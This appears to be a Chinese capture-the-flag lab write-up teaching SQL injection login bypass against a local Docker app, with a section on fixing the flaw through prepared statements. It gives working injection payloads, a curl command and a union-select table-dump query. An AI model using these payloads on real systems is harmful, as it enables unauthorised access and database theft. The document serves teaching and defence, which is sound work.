# 题解：青鸟管理系统（SQL 注入 · 登录绕过）

> 对应课件 p32「SQL 注入：先扔一个引号」。

## 一、题目与考点

| 项 | 值 |
|---|---|
| 考点 | SQL 注入、注释符、登录绕过、`SELECT` 结构 |
| 难度 | 2 |
| 端口 | 8084 |
| Flag 格式 | `flag{...}` |

一句话：用户名密码被直接拼进 SQL，**知道结构就不用知道密码**。

> 管理员密码是随机的，硬猜 **如何呢，又能怎**；所以只能走注入。

## 二、启动环境

> ⚠️ **Windows PowerShell 5.1 用户注意**：`curl` 在那里是 `Invoke-WebRequest` 的别名，
> 敲 `curl -H "A: B"` 会报「无法绑定参数 Headers」。请改用 **`curl.exe`**（Windows 10 1803+ 自带）。
> 完整命令对照表见总 README 的「**在 Windows 上怎么敲这些命令**」一节。

```bash
cd sqli-ctf
docker compose up -d --build
# 浏览器打开 http://127.0.0.1:8084/
```

两个服务：`web`（php:7.4-apache + pdo_mysql）和 `db`（mariadb:10.11，首次启动执行 `init.sql`）。

## 三、手把手解题

### Step 1｜先正常登录一次

用 `guest` / `guest` 能登进去，页面提示：

> 登录成功，但你是「guest」，不是管理员。

说明：登录逻辑是通的，只是权限不够。**别急着爆破密码**。

### Step 2｜扔一个引号，确认注入点

用户名输入 `'`，密码随便：

```
用户名：'
密码：x
```

页面报 SQL 语法错误 —— 说明你的输入**被拼进了 SQL 语句**。

### Step 3｜万能密码（先拿下 guest）

```
用户名：' or '1'='1' -- 
密码：随便
```

拼出来是：

```sql
SELECT * FROM users WHERE username = '' or '1'='1' -- ' AND password = '随便'
```

- `-- ` 把后面整段注释掉 → 密码条件消失
- `or '1'='1'` 恒真 → 返回第一行（guest）

> **`--` 后面必须有一个空格**，MySQL 才认这是注释。

### Step 4｜定向拿 admin

关键是把 `username` 指定成 admin，剩下的用注释抹掉：

```
用户名：admin' -- 
密码：随便
```

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = '随便'
```

命中 admin 行 → `role = admin` → 管理面板出现 Flag。

### Step 5｜命令行版（方便脚本化）

```bash
curl -s "http://127.0.0.1:8084/" \
  --data-urlencode "username=admin' -- " \
  --data-urlencode "password=x"
```

### Step 6｜进阶：把整张表 dump 出来

```sql
用户名：' or 1=1 union select 1,user,password,role from users -- 
```

在真实环境里，下一步通常就是 `union select` 拖库。

## 四、为什么能成（原理）

后台代码是罪魁祸首：

```php
$sql = "SELECT * FROM users WHERE username = '$u' AND password = '$p'";
$pdo->query($sql);
```

`$u` 直接进了字符串，于是**你输入的内容成了 SQL 语法的一部分**：

| 输入 | 拼接结果 | 效果 |
|---|---|---|
| `admin` | `... username = 'admin' AND password = 'x'` | 正常但密码不对 |
| `admin' -- ` | `... username = 'admin' -- ' AND password = 'x'` | 密码条件被注释 |
| `' or '1'='1' -- ` | `... username = '' or '1'='1' -- ...` | 条件恒真 |

**核心：闭合引号 → 注入语法 → 注释掉残余。** 这三步就是所有 SQL 注入的骨架。

## 五、怎么修（防御）

```php
// 正确：预处理 + 占位符，输入永远只是「值」
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$u, $p]);
```

- **PDO 预处理**（`?` 或 `:name`）是第一道也是最后一道防线
- 别用「转义函数」硬拼（`mysqli_real_escape_string` 只是兜底，宽字节/数字型仍会翻车）
- 最小权限：Web 用的数据库账号别给 `DROP`/`FILE`
- 登录失败信息统一成「用户名或密码错误」，别泄露「用户存在但密码错」

## 六、动态 Flag

`src/flag.inc.php` 优先读环境变量 `FLAG`；未注入则自动随机生成并缓存到 `/tmp/.web_ctf_flag`。
数据库里**没有** flag，只有管理员登录成功时由 PHP 输出。

`init.sql` 里 `admin` 的密码是一条随机 32 位串 —— 猜不到，也不需要猜到。

```bash
FLAG=flag{your-dynamic-flag} docker compose up -d
```
